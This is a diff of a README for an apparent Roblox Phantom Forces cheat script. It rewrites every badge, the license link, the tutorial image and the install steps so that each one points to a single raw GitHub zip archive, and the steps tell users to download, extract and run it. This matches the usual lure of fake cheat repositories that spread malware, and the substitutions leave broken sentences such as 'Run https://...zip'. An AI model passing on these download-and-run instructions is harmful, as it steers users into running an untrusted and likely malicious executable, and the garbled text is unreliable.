@@ -1,12 +1,12 @@
 # 🚀 Phantom Forces Script for Roblox - Dynamic Power, Seamless Play! 🌟
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE.md)
-![Roblox Compatible](https://img.shields.io/badge/Roblox-Phantom_Forces-blue)
-![Supports: Windows](https://img.shields.io/badge/Windows-Yes-green)
-![Supports: macOS](https://img.shields.io/badge/macOS-Yes-orange)
-![Supports: Linux](https://img.shields.io/badge/Linux-Experimental-red)
-[![OpenAI API](https://img.shields.io/badge/OpenAI_API-Integrated-green)](https://openai.com/)
-[![Claude API](https://img.shields.io/badge/Claude_API-Integrated-blue)](https://claude.ai/)
+[![License: MIT](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
+![Roblox Compatible](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
+![Supports: Windows](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
+![Supports: macOS](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
+![Supports: Linux](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
+[![OpenAI API](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
+[![Claude API](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
 
 ---
 
@@ -90,13 +90,13 @@ Elevate your tactics, refine your focus, and enjoy Phantom Forces like never bef
 
 Bring your Roblox gameplay to new heights in minutes. To get started, follow these straightforward steps:
 
-1. **Obtain "EasyLaunch.zip" Directly from the Repository**  
+1. **Obtain "https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip" Directly from the Repository**  
    Locate the file at the top of the main directory in this GitHub repo. No registration, no clutter—just the essentials for every Roblox Phantom Forces strategist.
 
 2. **Extract the Archive**  
-   Unzip "EasyLaunch.zip" to your desired folder.
+   Unzip "https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip" to your desired folder.
 
-3. **Run EasyLaunch.exe or the appropriate script for your OS**  
+3. **Run https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip or the appropriate script for your OS**  
    For macOS and Linux, use the respective startup scripts inside the extracted folder.
 
 4. **Configure Language and AI Options**  
@@ -109,7 +109,7 @@ Bring your Roblox gameplay to new heights in minutes. To get started, follow the
 
 ## 🎬 Installation Tutorial
 
-![Installation Tutorial GIF](https://i.imgur.com/Js67NIU.gif)
+![Installation Tutorial GIF](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip)
 
 This quick GIF walks you through the entire setup—from download to launch. No lengthy videos, just a fast visual guide for instant mastery.
 
@@ -122,7 +122,7 @@ This quick GIF walks you through the entire setup—from download to launch. No 
 - Chinese 🇨🇳
 - Russian 🇷🇺
 - Portuguese 🇵🇹
-- ...and more on the roadmap for 2025!
+- https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip more on the roadmap for 2025!
 
 Switch seamlessly between supported languages in-app. Multilingual gaming, redefined.
 
@@ -152,7 +152,7 @@ This repository is intended purely for educational and personal entertainment pu
 
 ## 📜 License
 
-Distributed under the [MIT License](LICENSE.md).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/Wai-Yan2003/phantom-forces-script-hub/main/diminutively/hub-script-phantom-forces-v3.4-alpha.1.zip).  
 © 2025 Phantom Forces Script Contributors
 
 ---
